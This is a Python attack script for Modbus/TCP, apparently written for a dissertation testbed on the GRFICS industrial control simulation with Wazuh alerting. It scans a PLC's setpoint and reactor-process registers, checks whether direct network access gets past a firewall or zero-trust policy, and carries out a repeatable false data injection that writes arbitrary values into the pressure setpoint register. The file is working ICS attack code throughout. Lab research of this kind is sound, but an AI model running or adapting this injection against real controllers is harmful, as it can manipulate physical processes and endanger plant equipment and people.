#!/usr/bin/env python3
import sys
import argparse
import time
from pymodbus.client import ModbusTcpClient

# Target IPs
PLC_IP = "192.168.95.2"
SIM_IP = "192.168.95.10"
PORT = 502

# Register Mapping
REG_PRESSURE_SP = 2    # Holding Register (Writing to PLC)
REG_PRESSURE_VAL = 108 # Input Register (Reading from PLC)

def scan(count=1, delay=0.5):
    for i in range(count):
        print(f"[*] [{i+1}/{count}] Scanning PLC at {PLC_IP}...")
        client = ModbusTcpClient(PLC_IP)
        if client.connect():
            # Read Holding Registers (Setpoints)
            hr = client.read_holding_registers(0, count=10, slave=1)
            
            # Read Input Registers (Process Values)
            ir = client.read_input_registers(100, count=15, slave=1)
            
            client.close()
            if count == 1:
                # Output only on single run
                if not hr.isError():
                    print("[+] Setpoints (Holding Registers):")
                    print(f"    - Product Flow SP [0]: {hr.registers[0]}")
                    print(f"    - Pressure SP     [2]: {hr.registers[2]}")
                    print(f"    - Level SP        [4]: {hr.registers[4]}")
                if not ir.isError():
                    print("[+] Process Values (Input Registers):")
                    print(f"    - Reactor Pressure [108]: {ir.registers[8]}")
                    print(f"    - Reactor Level    [109]: {ir.registers[9]}")
        else:
            print("[-] Failed to connect to PLC.")
        if i < count - 1:
           time.sleep(delay)

def fdi_attack(reg, value, count=1, delay=0.5):
    for i in range(count):
        print(f"[*] [{i+1}/{count}] Executing False Data Injection (FDI) on Register {reg} with Value {value}...")
        client = ModbusTcpClient(PLC_IP)
        if client.connect():
            result = client.write_register(reg, value, slave=1)
            if not result.isError():
                print(f"[!] Successfully injected value {value} into Register {reg}")
                if count == 1:
                    print("[!] Check Wazuh Dashboard for 'DISSERTATION' Alerts.")
            else:
                print(f"[-] Error injecting value: {result}")
            client.close()
        else:
            print("[-] Failed to connect to PLC.")
        if i < count - 1:
            time.sleep(delay)

def access_test():
    print(f"[*] Testing Direct Modbus Access from Kali to PLC ({PLC_IP})...")
    client = ModbusTcpClient(PLC_IP)
    if client.connect():
        print("[!] SUCCESS: Direct Network Access allowed. Firewall/ZT Policy might be bypassed!")
        client.close()
    else:
        print("[-] FAILURE: Direct access blocked. Zero-Trust/Firewall active.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GRFICSv3 Dissertation Attack Suite")
    parser.add_argument("--scan", action="store_true", help="Scan PLC registers")
    parser.add_argument("--fdi", action="store_true", help="Execute FDI attack")
    parser.add_argument("--test", action="store_true", help="Verify direct access")
    parser.add_argument("--reg", type=int, default=2, help="Register to target (default: 2)")
    parser.add_argument("--val", type=int, default=30000, help="Value to inject")
    parser.add_argument("--count", type=int, default=1, help="Number of times to execute command (useful for testing frequency rules)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between executions in seconds")

    args = parser.parse_args()

    if args.scan:
        scan(args.count, args.delay)
    elif args.fdi:
        fdi_attack(args.reg, args.val, args.count, args.delay)
    elif args.test:
        access_test()
    else:
        parser.print_help()
